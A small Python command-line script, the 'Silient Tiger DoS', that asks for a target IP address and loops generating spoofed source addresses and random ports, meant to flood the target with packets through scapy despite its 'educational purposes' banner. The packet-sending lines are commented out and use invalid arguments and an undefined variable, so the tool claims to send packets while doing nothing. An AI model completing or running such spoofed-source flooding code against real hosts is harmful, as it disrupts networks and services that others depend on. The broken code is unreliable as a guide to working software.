#!/usr/bin/python
import time
from sys import exit
from scapy.all import *
from progress.spinner import Spinner


def exit_program():
    print("\n" + "*" * 49)
    print("* CTRL+C Detected...........Exiting Gracefully  *")
    print("*\tThanks for participating ;)\t\t*")
    print("*" * 49)
    exit(0)


def generate_sourceIP():
    a = str(random.randint(100, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    source_IP = a + "." + b + "." + c + "." + d
    return source_IP


def IP_dos(target_IP):
    count = 1
    with Spinner('Sending Packets to ' + target_IP + ' (Press CRTL+C to exit)  ') as spinner:
        try:
            while True:
                time.sleep(.15)
                source_ip = generate_sourceIP()
                target_Port = str(random.randint(1, 65535))
                #				print("Sent from: " + source_ip + ", \tSent to: " + target_IP + ":"+target_Port)
                #				IP1 = IP(source_IP = source_IP, destination = target_IP)
                #				TCP1 = TCP(srcport = source_Port, dstport = target_Port)
                #				pkt = IP1/TCP1
                #				send(pkt, inter = .001)
                spinner.next()
        except KeyboardInterrupt:
            exit_program()


if __name__ == "__main__":
    print("*******************************Welcome to the Silient Tiger DoS******************************")
    print("*   This is for educational purposes and in no way encourage use on unauthorized network    *")
    print("*Unauthoriazed use of this code is strickly prohibited and can result in legal consequences.*")
    print("*********************************************************************************************")
    user_choice = 0
    try:
        while (user_choice != 3):
            user_choice = input("\n 1: IP DoS Attack\n 2: Exit\n")
            if user_choice == '1':
                target_IP = input("Enter IP address of target machine: ")
                IP_dos(target_IP)
            elif user_choice == '2':
                exit_program()
            else:
                print("Please choose a valid option...")
    except KeyboardInterrupt:
        exit_program()
